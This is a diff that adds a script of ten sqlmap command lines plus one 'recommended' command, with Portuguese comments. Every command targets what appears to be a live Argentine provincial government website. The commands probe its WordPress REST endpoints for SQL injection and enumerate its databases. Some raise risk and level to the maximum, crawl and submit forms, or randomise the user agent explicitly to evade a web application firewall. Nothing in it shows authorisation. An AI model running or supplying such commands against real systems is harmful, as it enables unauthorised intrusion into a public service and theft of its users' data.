@@ -1,0 +1,40 @@
+# ============================================
+# ETAPA 17: SQL INJECTION TESTING
+# Comandos sqlmap para executar manualmente
+# ============================================
+
+# Comando 1: Testar endpoint específico com parâmetro id
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs
+
+# Comando 2: Testar endpoint com parâmetro page_id
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?page_id=1" --batch --dbs
+
+# Comando 3: Testar endpoint base automaticamente (forms e crawl)
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar" --forms --crawl=2 --batch
+
+# Comando 4: Testar endpoint wp-json com todos os parâmetros
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992" --batch --dbs
+
+# Comando 5: Testar com parâmetro password (já identificado como funcional)
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" --batch --dbs
+
+# Comando 6: Testar com parâmetro context
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=view" --batch --dbs
+
+# Comando 7: Testar múltiplos parâmetros simultaneamente
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1&page_id=1&context=view" --batch --dbs
+
+# Comando 8: Testar com nível de risco e profundidade aumentados
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --risk=3 --level=5 --dbs
+
+# Comando 9: Testar apenas detecção (sem exploração)
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs --technique=BEUSTQ
+
+# Comando 10: Testar com user-agent customizado (evasão de WAF)
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs --random-agent
+
+# ============================================
+# COMANDO RECOMENDADO PARA INICIAR:
+# ============================================
+python3 /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs
+
